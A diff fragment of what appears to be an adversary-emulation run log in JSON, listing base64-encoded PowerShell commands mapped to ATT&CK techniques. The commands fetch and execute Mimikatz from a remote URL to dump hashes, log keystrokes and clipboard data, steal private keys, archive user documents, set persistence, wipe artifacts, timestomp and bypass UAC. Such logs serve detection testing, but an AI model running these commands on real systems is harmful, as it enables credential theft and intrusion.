+          "command": "aWYgKCEgJCh0ZXN0LXBhdGggLXBhdGggIkM6XFByb2dyYW0gRmlsZXNcU3lzSW50ZXJuYWxzU3VpdGUiKSkgeyAgd3JpdGUtaG9zdCAiWyFdIFRoZSBwYXRoIEM6XFByb2dyYW0gRmlsZXNcU3lzSW50ZXJuYWxzU3VpdGUgZG9lcyBub3QgZXhpc3QuIEV4ZWN1dGlvbiBoYXMgc3RvcHBlZC4iOyAgZXhpdCAxO31TZXQtTG9jYXRpb24gLXBhdGggIkM6XFByb2dyYW0gRmlsZXNcU3lzSW50ZXJuYWxzU3VpdGUiO2lmICghKHRlc3QtcGF0aCAiLlxyZWFkbWUucHMxIikpIHsgIE1vdmUtSXRlbSAuXHJlYWRtZS50eHQgcmVhZG1lLnBzMSAtRm9yY2U7fS4gLlxyZWFkbWUucHMxO0ludm9rZS1EaXNjb3Zlcnk7",
+          "delegated": "2022-09-29 19:51:41",
+          "run": "2022-09-29 19:52:40",
+          "status": 0,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 1524,
+          "description": "Load Stage-2 from Modified Sysinternals Toolset",
+          "name": "Loading Stage-2 & Performing Discovery",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "System Information Discovery",
+            "technique_id": "T1082"
+          },
+          "agent_reported_time": "2022-09-29 19:52:39"
+        },
+        {
+          "link_id": "e3217cb5-01fa-4c04-bec3-b346c8d9a9a4",
+          "ability_id": "ba0b398d-91b8-490a-bed2-f959afa8e1aa",
+          "command": "bmV0c3RhdCAtYW5v",
+          "delegated": "2022-09-29 19:52:42",
+          "run": "2022-09-29 19:53:42",
+          "status": 0,
+          "platform": "windows",
+          "executor": "cmd",
+          "pid": 2956,
+          "description": "The netstat utility is executed via cmd to enumerate local active network connections.",
+          "name": "4.C.2 - System Network Connections Discovery (T1049)",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "System Network Connections Discovery",
+            "technique_id": "T1049"
+          },
+          "agent_reported_time": "2022-09-29 19:53:42"
+        },
+        {
+          "link_id": "5cda04b9-01d0-41e4-a04d-42b4812472d5",
+          "ability_id": "effbedc1-1bc8-4a75-9395-980559700008",
+          "command": "W1N5c3RlbS5OZXQuU2VydmljZVBvaW50TWFuYWdlcl06OlNlcnZlckNlcnRpZmljYXRlVmFsaWRhdGlvbkNhbGxiYWNrID0geyAkVHJ1ZSB9OyR3ZWIgPSAoTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCk7JHJlc3VsdCA9ICR3ZWIuRG93bmxvYWRTdHJpbmcoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9FbXBpcmVQcm9qZWN0L0VtcGlyZS9tYXN0ZXIvZGF0YS9tb2R1bGVfc291cmNlL2NyZWRlbnRpYWxzL0ludm9rZS1NaW1pa2F0ei5wczEiKTtpZXggJHJlc3VsdDtmdW5jdGlvbiBoYXNoZHVtcHsgICAgSW52b2tlLU1pbWlrYXR6IC1Db21tYW5kICJwcml2aWxlZ2U6OmRlYnVnIHRva2VuOjplbGV2YXRlIGxzYWR1bXA6OnNhbSBleGl0In07aGFzaGR1bXA7",
+          "delegated": "2022-09-29 19:53:47",
+          "run": "2022-09-29 19:54:36",
+          "status": 1,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 600,
+          "description": "Mimikatz lsadump::sam is executed via Invoke-Mimikatz to dump hashes via process injection into LSASS.",
+          "name": "Credential Dumping using Process Injection",
+          "attack": {
+            "tactic": "credential-access",
+            "technique_name": "Credential Dumping",
+            "technique_id": "T1003"
+          },
+          "agent_reported_time": "2022-09-29 19:54:23"
+        },
+        {
+          "link_id": "b55861c8-64c2-4fbc-9b03-0bf89411f746",
+          "ability_id": "9c75155e-21ab-4471-af16-45f3795a313c",
+          "command": "U2V0LUxvY2F0aW9uIC1wYXRoICJDOlxQcm9ncmFtIEZpbGVzXFN5c2ludGVybmFsc1N1aXRlIjtpZiAoZ2V0LXNlcnZpY2UgLW5hbWUgImphdmFtdHN1cCIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpIHsgIHdyaXRlLWhvc3QgIlsqXSBTZXJ2aWNlIGFscmVhZHkgZXhpc3RzLi4uTm90IHJ1bm5pbmcgcGVyc2lzdGVuY2Ugc3RlcC0xIjsgIGV4aXQgMTt9aWYgKFRlc3QtUGF0aCAtcGF0aCAicmVhZG1lLnBzMSIpIHsgIC4gLlxyZWFkbWUucHMxOyAgSW52b2tlLVBlcnNpc3RlbmNlIC1QZXJzaXN0U3RlcCAxOyAgd3JpdGUtaG9zdCAiWytdIFBlcnNpc3RlbmNlIDEgaW52b2tlZC4iOyAgZXhpdCAwO30gZWxzZSB7ICB3cml0ZS1ob3N0ICJbIV0gcmVhZG1lLnBzMSBub3QgZm91bmQuIjsgIGV4aXQgMTt9",
+          "delegated": "2022-09-29 19:54:37",
+          "run": "2022-09-29 19:55:05",
+          "status": 1,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 5444,
+          "description": "Leverage modified Sysinternals",
+          "name": "Persistent Service 1",
+          "attack": {
+            "tactic": "persistence",
+            "technique_name": "Boot or Logon Autostart Execution: Shortcut Modification",
+            "technique_id": "T1547.009"
+          },
+          "agent_reported_time": "2022-09-29 19:55:04"
+        },
+        {
+          "link_id": "f6c46b8c-f6a2-471b-a0b9-873d7d81d8ed",
+          "ability_id": "45f18b58-c14f-4b61-a3da-41b67af21429",
+          "command": "U2V0LUxvY2F0aW9uIC1wYXRoICJDOlxQcm9ncmFtIEZpbGVzXFN5c2ludGVybmFsc1N1aXRlIjtpZiAoVGVzdC1QYXRoIC1wYXRoICJyZWFkbWUucHMxIikgeyAgLiAuXHJlYWRtZS5wczE7ICBJbnZva2UtUGVyc2lzdGVuY2UgLVBlcnNpc3RTdGVwIDI7ICB3cml0ZS1ob3N0ICJbK10gUGVyc2lzdGVuY2UgMiBpbnZva2VkLiI7fSBlbHNlIHsgIHdyaXRlLWhvc3QgIlshXSByZWFkbWUucHMxIG5vdCBmb3VuZC4iOyAgcmV0dXJuIDE7fQ==",
+          "delegated": "2022-09-29 19:55:08",
+          "run": "2022-09-29 19:55:59",
+          "status": 0,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 1204,
+          "description": "Leverage modified Sysinternals",
+          "name": "Persistent Service 2",
+          "attack": {
+            "tactic": "persistence",
+            "technique_name": "Boot or Logon Autostart Execution: Shortcut Modification",
+            "technique_id": "T1547.009"
+          },
+          "agent_reported_time": "2022-09-29 19:55:58"
+        },
+        {
+          "link_id": "d4061faf-eee6-4432-82f7-8a54b2be0208",
+          "ability_id": "e7cab9bb-3e3a-4d93-99cc-3593c1dc8c6d",
+          "command": "aWYgKCEgJCh0ZXN0LXBhdGggLXBhdGggIkM6XFByb2dyYW0gRmlsZXNcU3lzaW50ZXJuYWxzU3VpdGUiKSkgeyAgd3JpdGUtaG9zdCAiWyFdIFRoZSBwYXRoIEM6XFByb2dyYW0gRmlsZXNcU3lzaW50ZXJuYWxzU3VpdGUgZG9lcyBub3QgZXhpc3QuIEV4ZWN1dGlvbiBoYXMgc3RvcHBlZC4iOyAgZXhpdCAxO31TZXQtTG9jYXRpb24gLXBhdGggIkM6XFByb2dyYW0gRmlsZXNcU3lzaW50ZXJuYWxzU3VpdGUiOy4vYWNjZXNzY2hrLmV4ZSAtYWNjZXB0ZXVsYSAuOw==",
+          "delegated": "2022-09-29 19:56:03",
+          "run": "2022-09-29 19:57:07",
+          "status": 0,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 7716,
+          "description": "Obtain credentials from Chrome Dumper",
+          "name": "Credentials In Files- Chrome",
+          "attack": {
+            "tactic": "credential-access",
+            "technique_name": "Credential Dumping",
+            "technique_id": "T1003"
+          },
+          "agent_reported_time": "2022-09-29 19:57:06"
+        },
+        {
+          "link_id": "dcb2aa4e-700a-4cdb-8e82-d08d3fb706d9",
+          "ability_id": "c4f4b13c-87b6-498c-b814-93570173068c",
+          "command": "SW1wb3J0LVBmeENlcnRpZmljYXRlIC1FeHBvcnRhYmxlIC1GaWxlUGF0aCAiLlxkbWV2YWxzLmxvY2FsLnBmeCIgLUNlcnRTdG9yZUxvY2F0aW9uIENlcnQ6XExvY2FsTWFjaGluZVxNeTtpZiAoISAkKHRlc3QtcGF0aCAtcGF0aCAiQzpcUHJvZ3JhbSBGaWxlc1xTeXNpbnRlcm5hbHNTdWl0ZSIpKSB7ICB3cml0ZS1ob3N0ICJbIV0gVGhlIHBhdGggQzpcUHJvZ3JhbSBGaWxlc1xTeXNpbnRlcm5hbHNTdWl0ZSBkb2VzIG5vdCBleGlzdC4gRXhlY3V0aW9uIGhhcyBzdG9wcGVkLiI7ICBleGl0IDE7fVNldC1Mb2NhdGlvbiAtcGF0aCAiQzpcUHJvZ3JhbSBGaWxlc1xTeXNpbnRlcm5hbHNTdWl0ZSI7LiAuXHJlYWRtZS5wczE7R2V0LVByaXZhdGVLZXlzO2lmICgkPyAtZXEgJFRydWUpIHsgICAgd3JpdGUtaG9zdCAiWytdIFN1Y2Nlc3NmdWxseSBleGVjdXRlZCBwcml2YXRlIGtleSBjb2xsZWN0aW9uIHNjcmlwdC4iOyAgICBleGl0IDA7fSBlbHNlIHsgICAgd3JpdGUtaG9zdCAiWyFdIEVycm9yLCBjb3VsZCBub3QgZXhlY3V0aW9uIEdldC1Qcml2YXRlS2V5cy4iOyAgICBleGl0IDE7fQ==",
+          "delegated": "2022-09-29 19:57:09",
+          "run": "2022-09-29 19:57:50",
+          "status": 0,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 1684,
+          "description": "Obtain credentials via Custom PowerShell",
+          "name": "Credentials In Files (T1081) - Private Keys Extraction",
+          "attack": {
+            "tactic": "credential-access",
+            "technique_name": "Unsecured Credentials: Private Keys",
+            "technique_id": "T1552.004"
+          },
+          "agent_reported_time": "2022-09-29 19:57:46"
+        },
+        {
+          "link_id": "430b711d-0a3e-4f44-b71a-e454db45a089",
+          "ability_id": "a4b14c10-49aa-4ae4-b165-d5a37364fe62",
+          "command": "aWYgKCEgJCh0ZXN0LXBhdGggLXBhdGggIkM6XFByb2dyYW0gRmlsZXNcU3lzSW50ZXJuYWxzU3VpdGUiKSkgeyAgd3JpdGUtaG9zdCAiWyFdIFRoZSBwYXRoIEM6XFByb2dyYW0gRmlsZXNcU3lzSW50ZXJuYWxzU3VpdGUgZG9lcyBub3QgZXhpc3QuIEV4ZWN1dGlvbiBoYXMgc3RvcHBlZC4iOyAgZXhpdCAxO31TZXQtTG9jYXRpb24gLXBhdGggIkM6XFByb2dyYW0gRmlsZXNcU3lzSW50ZXJuYWxzU3VpdGUiO2lmICh0ZXN0LXBhdGggLXBhdGggIi5ccHN2ZXJzaW9uLnR4dCIgKSB7ICBtb3ZlLWl0ZW0gLlxwc3ZlcnNpb24udHh0IHBzdmVyc2lvbi5wczEgLUZvcmNlO30gIHdyaXRlLWhvc3QgIlsrXSBGaWxlIHBzdmVyc2lvbi5wczEgc3RhZ2VkIHRvIGJlIGltcG9ydGVkLiI=",
+          "delegated": "2022-09-29 19:57:54",
+          "run": "2022-09-29 19:58:46",
+          "status": 0,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 3376,
+          "description": "Renaming psversion.txt to psversion.txt to be imported",
+          "name": "Staging files for PowerShell module imports",
+          "attack": {
+            "tactic": "defensive-evasion",
+            "technique_name": "Masquerading: Match Legitimate Name or Location",
+            "technique_id": "T1036.005"
+          },
+          "agent_reported_time": "2022-09-29 19:58:45"
+        },
+        {
+          "link_id": "77fcbc9f-d60f-492c-aac8-068460a18fa1",
+          "ability_id": "a81ea4ad-bc9f-49a7-82d4-4466df641487",
+          "command": "aWYgKCEgJCh0ZXN0LXBhdGggLXBhdGggIkM6XFByb2dyYW0gRmlsZXNcU3lzaW50ZXJuYWxzU3VpdGVccHN2ZXJzaW9uLnBzMSI7KSkgeyAgd3JpdGUtaG9zdCAiWyFdIFRoZSBwYXRoIEM6XFByb2dyYW0gRmlsZXNcU3lzaW50ZXJuYWxzU3VpdGVccHN2ZXJzaW9uLnBzMSBkb2VzIG5vdCBleGlzdC4gRXhlY3V0aW9uIGhhcyBzdG9wcGVkLiI7ICBleGl0IDE7fVNldC1Mb2NhdGlvbiAtcGF0aCAiQzpcUHJvZ3JhbSBGaWxlc1xTeXNpbnRlcm5hbHNTdWl0ZSI7LiAuXHBzdmVyc2lvbi5wczE7SW52b2tlLVNjcmVlbkNhcHR1cmU7IFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDM7IFZpZXctSm9iIC1Kb2JOYW1lICJTY3JlZW5zaG90Ijs=",
+          "delegated": "2022-09-29 19:58:49",
+          "run": "2022-09-29 19:59:54",
+          "status": 0,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 7804,
+          "description": "Load custom PowerShell module and take screenshots.",
+          "name": "Screen Capturing",
+          "attack": {
+            "tactic": "collection",
+            "technique_name": "Screen Capture",
+            "technique_id": "T1113"
+          },
+          "agent_reported_time": "2022-09-29 19:59:49"
+        },
+        {
+          "link_id": "5bf8b328-4c40-4e85-862c-d8f71628acd2",
+          "ability_id": "ee4c2eab-be57-434c-a32c-14b77360301a",
+          "command": "JGNsaXBfZGF0YT1nZXQtY2xpcGJvYXJkO2lmICgkY2xpcF9kYXRhLkxlbmd0aCAtZ3QgMCkgeyAgd3JpdGUtaG9zdCAiWytdIENsaXBib2FyZCBkYXRhIG9idGFpbmVkIVxuIjsgIHdyaXRlLWhvc3QgJGNsaXBfZGF0YTt9IGVsc2UgeyAgd3JpdGUtaG9zdCAiWyFdIE5vIGNsaXBib2FyZCBkYXRhIGF2YWlsYWJsZSFcbiI7fQ==",
+          "delegated": "2022-09-29 19:59:55",
+          "run": "2022-09-29 20:00:27",
+          "status": 0,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 4256,
+          "description": "Get contents of clipboard",
+          "name": "Automated Collection (T1119) - Clipboard (T1115)",
+          "attack": {
+            "tactic": "collection",
+            "technique_name": "Clipboard Data",
+            "technique_id": "T1115"
+          },
+          "agent_reported_time": "2022-09-29 20:00:26"
+        },
+        {
+          "link_id": "aab020f4-6acc-4ed7-83ec-19111cdb97ed",
+          "ability_id": "db28f68d-e8b8-46e6-b680-642570d4b257",
+          "command": "aWYgKCEgJCh0ZXN0LXBhdGggLXBhdGggIkM6XFByb2dyYW0gRmlsZXNcU3lzaW50ZXJuYWxzU3VpdGUiKSkgeyAgd3JpdGUtaG9zdCAiWyFdIFRoZSBwYXRoIEM6XFByb2dyYW0gRmlsZXNcU3lzaW50ZXJuYWxzU3VpdGUgZG9lcyBub3QgZXhpc3QuIEV4ZWN1dGlvbiBoYXMgc3RvcHBlZC4iOyAgZXhpdCAxO31TZXQtTG9jYXRpb24gLXBhdGggIkM6XFByb2dyYW0gRmlsZXNcU3lzaW50ZXJuYWxzU3VpdGUiOy4gLlxwc3ZlcnNpb24ucHMxO0dldC1LZXlzdHJva2VzO1N0YXJ0LVNsZWVwIC1TZWNvbmRzIDE1O1ZpZXctSm9iIC1Kb2JOYW1lICJLZXlzdHJva2VzIjs=",
+          "delegated": "2022-09-29 20:00:30",
+          "run": "2022-09-29 20:01:36",
+          "status": 0,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 1340,
+          "description": "Load custom PowerShell module, and grab keystrokes for 15 seconds.",
+          "name": "Automated Collection (T1119) - Input Capture (T1417)",
+          "attack": {
+            "tactic": "collection",
+            "technique_name": "Input Capture: Keylogging",
+            "technique_id": "T1056.001"
+          },
+          "agent_reported_time": "2022-09-29 20:01:19"
+        },
+        {
+          "link_id": "fdd38a5b-5695-4c3b-b778-5970f8d26868",
+          "ability_id": "95564347-e77a-4a89-b08f-dcafa5468f2c",
+          "command": "aWYgKCEgJCh0ZXN0LXBhdGggLXBhdGggIkM6XFByb2dyYW0gRmlsZXNcU3lzaW50ZXJuYWxzU3VpdGUiKSkgeyAgd3JpdGUtaG9zdCAiWyFdIFRoZSBwYXRoIEM6XFByb2dyYW0gRmlsZXNcU3lzaW50ZXJuYWxzU3VpdGUgZG9lcyBub3QgZXhpc3QuIEV4ZWN1dGlvbiBoYXMgc3RvcHBlZC4iOyAgZXhpdCAxO31TZXQtTG9jYXRpb24gLXBhdGggIkM6XFByb2dyYW0gRmlsZXNcU3lzaW50ZXJuYWxzU3VpdGUiOy4gLlxwc3ZlcnNpb24ucHMxO0FkLVNlYXJjaCBDb21wdXRlciBOYW1lICo7",
+          "delegated": "2022-09-29 20:01:40",
+          "run": "2022-09-29 20:02:22",
+          "status": 0,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 7664,
+          "description": "Custom PowerShell script to perform AD triage for domain bound computers.",
+          "name": "Remote System Discovery (T1018)",
+          "attack": {
+            "tactic": "execution",
+            "technique_name": "Command and Scripting Interpreter: PowerShell",
+            "technique_id": "T1059.001"
+          },
+          "agent_reported_time": "2022-09-29 20:02:12"
+        },
+        {
+          "link_id": "62199c5e-1821-4cae-8ce9-2d62c8d7ea4a",
+          "ability_id": "c4a59e39-53b0-4ace-9528-8ff052752ece",
+          "command": "SW52b2tlLUNvbW1hbmQgLUNvbXB1dGVyTmFtZSAiJChob3N0bmFtZSkiIC1TY3JpcHRCbG9jayB7IEdldC1Qcm9jZXNzIC1JbmNsdWRlVXNlck5hbWUgfCBTZWxlY3QtT2JqZWN0IFVzZXJOYW1lLFNlc3Npb25JZCB8IFdoZXJlLU9iamVjdCB7ICRfLlVzZXJOYW1lIC1saWtlICIqXCRlbnY6VVNFUk5BTUUiIH0gfCBTb3J0LU9iamVjdCBTZXNzaW9uSWQgLVVuaXF1ZSB9IHwgU2VsZWN0LU9iamVjdCBVc2VyTmFtZSxTZXNzaW9uSWQgLUxhc3QgMTs=",
+          "delegated": "2022-09-29 20:02:26",
+          "run": "2022-09-29 20:03:02",
+          "status": 0,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 7084,
+          "description": "Custom PowerShell script to perform AD triage for domain bound computers.",
+          "name": "Identifying current user on other machines",
+          "attack": {
+            "tactic": "execution",
+            "technique_name": "Command and Scripting Interpreter: PowerShell",
+            "technique_id": "T1059.001"
+          },
+          "agent_reported_time": "2022-09-29 20:03:00"
+        },
+        {
+          "link_id": "033dbcc0-8120-4e50-acf4-559ea230410f",
+          "ability_id": "0b1841bd-ef8b-475c-bce7-8fcb2860984a",
+          "command": "SW1wb3J0LU1vZHVsZSAuXEdldC1TY3JlZW5zaG90LnBzMSAtVmVyYm9zZSAtRm9yY2U7R2V0LVNjcmVlbnNob3Q7",
+          "delegated": "2022-09-29 20:03:06",
+          "run": "2022-09-29 20:03:39",
+          "status": 0,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 892,
+          "description": "Native API call(s) were used to collect a screenshot.",
+          "name": "Screen Capture (T1113)",
+          "attack": {
+            "tactic": "collection",
+            "technique_name": "Screen Capture",
+            "technique_id": "T1113"
+          },
+          "agent_reported_time": "2022-09-29 20:03:38"
+        },
+        {
+          "link_id": "3e1f65ff-00cc-480e-a4c8-4dd9383a6812",
+          "ability_id": "08e57385-dbce-4850-8bb7-589ef79465ab",
+          "command": "bW92ZS1pdGVtIFJhci5leGUgLURlc3RpbmF0aW9uIEM6XFdpbmRvd3NcVGVtcCAtRm9yY2U7JGVudjpBUFBEQVRBOyRmaWxlcz1DaGlsZEl0ZW0gLVBhdGggJGVudjpVU0VSUFJPRklMRVwgLUluY2x1ZGUgKi5kb2MsKi54cHMsKi54bHMsKi5wcHQsKi5wcHMsKi53cHMsKi53cGQsKi5vZHMsKi5vZHQsKi5sd3AsKi5qdGQsKi5wZGYsKi56aXAsKi5yYXIsKi5kb2N4LCoudXJsLCoueGxzeCwqLnBwdHgsKi5wcHN4LCoucHN0LCoub3N0LCpwc3cqLCpwYXNzKiwqbG9naW4qLCphZG1pbiosKnNpZnIqLCpzaWZlciosKnZwbiwqLmpwZywqLnR4dCwqLmxuayAtUmVjdXJzZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IFNlbGVjdCAtRXhwYW5kUHJvcGVydHkgRnVsbE5hbWU7IENvbXByZXNzLUFyY2hpdmUgLUxpdGVyYWxQYXRoICRmaWxlcyAtQ29tcHJlc3Npb25MZXZlbCBPcHRpbWFsIC1EZXN0aW5hdGlvblBhdGggJGVudjpBUFBEQVRBXHdvcmtpbmcuemlwIC1Gb3JjZTtjZCBDOlxXaW5kb3dzXFRlbXA7LlxSYXIuZXhlIGEgLWhwZkd6cTV5S3cgIiRlbnY6VVNFUlBST0ZJTEVcRGVza3RvcFx3b3JraW5nLnppcCIgIiRlbnY6QVBQREFUQVx3b3JraW5nLnppcCI7",
+          "delegated": "2022-09-29 20:04:40",
+          "run": "2022-09-29 20:05:45",
+          "status": 124,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 5620,
+          "description": "Execute PowerShell collection command to collect and compress files of specific extensions.",
+          "name": "Automated document collection (T1119)",
+          "attack": {
+            "tactic": "execution",
+            "technique_name": "Command and Scripting Interpreter: PowerShell",
+            "technique_id": "T1059.001"
+          },
+          "agent_reported_time": "2022-09-29 20:04:44"
+        },
+        {
+          "link_id": "65aa09fb-dbba-4f85-b484-d297a518f6cf",
+          "ability_id": "4bedbd9b-a570-4f9f-b78a-2f7f99ad5e92",
+          "command": "UmVtb3ZlLUl0ZW0gLVBhdGggIiRlbnY6VVNFUlBST0ZJTEVcRG93bmxvYWRzXCoucGZ4IiAtRm9yY2U7UmVtb3ZlLUl0ZW0gLVBhdGggIiRlbnY6VVNFUlBST0ZJTEVcRG93bmxvYWRzXCouYm1wIiAtRm9yY2U7UmVtb3ZlLUl0ZW0gLVBhdGggIiRlbnY6VVNFUlBST0ZJTEVcRG93bmxvYWRzXCoucG5nIiAtRm9yY2U7aWYgKHRlc3QtcGF0aCAtcGF0aCAiJGVudjpBUFBEQVRBXE9mZmljZVN1cHBsaWVzLjd6IikgeyAgICBSZW1vdmUtSXRlbSAtUGF0aCAiJGVudjpBUFBEQVRBXE9mZmljZVN1cHBsaWVzLjd6IiAtRm9yY2U7IHdyaXRlLWhvc3QgIlsrXSBTdWNjZXNzZnVsbHkgcmVtb3ZlZCBPZmZpY2VTdXBwbGllcy43eiI7fSBlbHNlIHsgICAgd3JpdGUtaG9zdCAiWyFdIEZpbGUgZGlkIG5vdCBleGlzdCB0byBiZSByZW1vdmVkISI7fWlmIChnZXQtam9iIC1uYW1lICJLZXlzdHJva2VzIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkgeyAgICBSZW1vdmUtSm9iIC1OYW1lICJLZXlzdHJva2VzIjsgICAgaWYgKCQ/KSB7ICAgICAgICB3cml0ZS1ob3N0ICJbK10gSm9iIFwiS2V5c3Ryb2tlc1wiIHdhcyByZW1vdmUuIjsgICAgfX0gZWxzZSB7ICAgIHdyaXRlLWhvc3QgIlshXSBKb2IgXCJLZXlzdHJva2VzXCIgZGlkIG5vdCBleGlzdC4iO31pZiAoZ2V0LWpvYiAtTmFtZSAiU2NyZWVuc2hvdCIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpIHsgICAgUmVtb3ZlLUpvYiAtTmFtZSAiU2NyZWVuc2hvdCIgLUZvcmNlOyAgICB3cml0ZS1ob3N0ICJbK10gSm9iIFwic2NyZWVuc2hvdFwiIHdhcyByZW1vdmVkLiI7fSBlbHNlIHsgICAgd3JpdGUtaG9zdCAiWypdIEpvYiBcInNjcmVlbnNob3RcIiBkb2VzIG5vdCBleGlzdCwgdGh1cyB3YXMgbm90IHJlbW92ZWQuIjt9cmVtb3ZlLWl0ZW0gdXBsb2FkLnBzMSAtRm9yY2U7",
+          "delegated": "2022-09-29 20:05:45",
+          "run": "2022-09-29 20:06:40",
+          "status": 1,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 6004,
+          "description": "Delete file artifacts left from the operation.",
+          "name": "Artifact Cleanup",
+          "attack": {
+            "tactic": "defensive-evasion",
+            "technique_name": "Indicator Removal on Host: File Deletion",
+            "technique_id": "T1070.004"
+          },
+          "agent_reported_time": "2022-09-29 20:06:25"
+        },
+        {
+          "link_id": "6fea5a16-a20d-4889-8cd8-8d57f894078b",
+          "ability_id": "4a2ad84e-a93a-4b2e-b1f0-c354d6a41278",
+          "command": "aWYgKCEodGVzdC1wYXRoIC1wYXRoICIkZW52OmFwcGRhdGFcTWljcm9zb2Z0XGt4d24ubG9jayIpKSB7ICB3cml0ZS1ob3N0ICJbIV0ga3h3bi5sb2NrIHdhcyBub3QgZm91bmQgb24gdGhpcyBob3N0LiI7ICBleGl0IDE7fSBlbHNlIHsgIC4gLlx0aW1lc3RvbXAucHMxOyAgdGltZXN0b21wIC1kZXN0ICIkZW52OmFwcGRhdGFcTWljcm9zb2Z0XGt4d24ubG9jayI7fQ==",
+          "delegated": "2022-09-29 20:06:51",
+          "run": "2022-09-29 20:07:20",
+          "status": 1,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 1740,
+          "description": "Timestomp kxwn.lock",
+          "name": "Timestomp kxwn.lock",
+          "attack": {
+            "tactic": "defensive-evasion",
+            "technique_name": "Indicator Removal on Host: Timestomp",
+            "technique_id": "T1070.006"
+          },
+          "agent_reported_time": "2022-09-29 20:07:17"
+        },
+        {
+          "link_id": "ad6e1d5f-1784-4153-b5e7-4d9c73f70223",
+          "ability_id": "f9c0b150-822f-497b-ad6d-187f24561e9a",
+          "command": "LiAuXHN0ZXBUd2VsdmUucHMxO2RldGVjdGF2",
+          "delegated": "2022-09-29 20:09:21",
+          "run": "2022-09-29 20:09:50",
+          "status": 0,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 5856,
+          "description": "Detect anti-virus software on host",
+          "name": "Detect Anti-Virus",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "Software Discovery: Security Software Discovery",
+            "technique_id": "T1518.001"
+          },
+          "agent_reported_time": "2022-09-29 20:09:49"
+        },
+        {
+          "link_id": "45c566d3-30c3-44de-a156-94bf81cb48ac",
+          "ability_id": "2b5a72b1-01e4-48ae-98b0-2570a7894371",
+          "command": "LiAuXHN0ZXBUd2VsdmUucHMxO3NvZnR3YXJlOw==",
+          "delegated": "2022-09-29 20:09:51",
+          "run": "2022-09-29 20:10:47",
+          "status": 0,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 2684,
+          "description": "Detect software on host",
+          "name": "Detect Software",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "Software Discovery",
+            "technique_id": "T1518"
+          },
+          "agent_reported_time": "2022-09-29 20:10:46"
+        },
+        {
+          "link_id": "6fed6b38-cc10-40d4-8001-5c231e7ddeb9",
+          "ability_id": "0cfadbcb-ec21-44ae-adb7-9a23176dd620",
+          "command": "LiAuXHN0ZXBUaGlydGVlbi5wczE7Y29tcDs=",
+          "delegated": "2022-09-29 20:10:51",
+          "run": "2022-09-29 20:11:26",
+          "status": 0,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 6100,
+          "description": "Triage host for ComputerNameNetBIOS,ComputerNameDnsHostname,ComputerNameDnsDomain,ComputerNameDnsFullyQualified,ComputerNamePhysicalNetBIOS,ComputerNamePhysicalDnsHostname,ComputerNamePhysicalDnsDomain,ComputerNamePhysical,DnsFullyQualifie",
+          "name": "Enumerate Computer Name",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "System Information Discovery",
+            "technique_id": "T1082"
+          },
+          "agent_reported_time": "2022-09-29 20:11:25"
+        },
+        {
+          "link_id": "83510fbe-1eb2-4761-95aa-1a9a5f80671c",
+          "ability_id": "96140694-6d13-40b6-9553-0e63533469f3",
+          "command": "LiAuXHN0ZXBUaGlydGVlbi5wczE7ZG9tYWluOw==",
+          "delegated": "2022-09-29 20:11:27",
+          "run": "2022-09-29 20:12:27",
+          "status": 0,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 1096,
+          "description": "Domain triage",
+          "name": "Enumerate Domain Name",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "System Information Discovery",
+            "technique_id": "T1082"
+          },
+          "agent_reported_time": "2022-09-29 20:12:26"
+        },
+        {
+          "link_id": "04ba768a-04c6-4b44-86f3-0e4852b11900",
+          "ability_id": "f320eebd-e75b-4194-b529-79e64ad0b9ee",
+          "command": "LiAuXHN0ZXBUaGlydGVlbi5wczE7dXNlcjs=",
+          "delegated": "2022-09-29 20:12:32",
+          "run": "2022-09-29 20:13:26",
+          "status": 0,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 400,
+          "description": "user triage",
+          "name": "Enumerate Username",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "System Owner/User Discovery",
+            "technique_id": "T1033"
+          },
+          "agent_reported_time": "2022-09-29 20:13:25"
+        },
+        {
+          "link_id": "c0a2dd96-6694-48ef-ac52-9c95b157bb88",
+          "ability_id": "a34ab8f2-a106-41fb-af0b-cf5382bd18ae",
+          "command": "LiAuXHN0ZXBUaGlydGVlbi5wczE7cHNsaXN0Ow==",
+          "delegated": "2022-09-29 20:13:27",
+          "run": "2022-09-29 20:14:16",
+          "status": 0,
+          "platform": "windows",
+          "executor": "psh",
+          "pid": 7932,
+          "description": "Process triage",
+          "name": "Enumerate Processes",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "Process Discovery",
+            "technique_id": "T1057"
+          },
+          "agent_reported_time": "2022-09-29 20:14:14"
+        },
+        {
+          "link_id": "f044e50b-7c22-4b46-b06d-2185c922471d",
+          "ability_id": "5226e5dc-fc28-43b7-a679-0db49d520402",
+          "command": "LiAuXHN0ZXBGb3VydGVlbl9ieXBhc3NVQUMucHMxO2J5cGFzczs=",
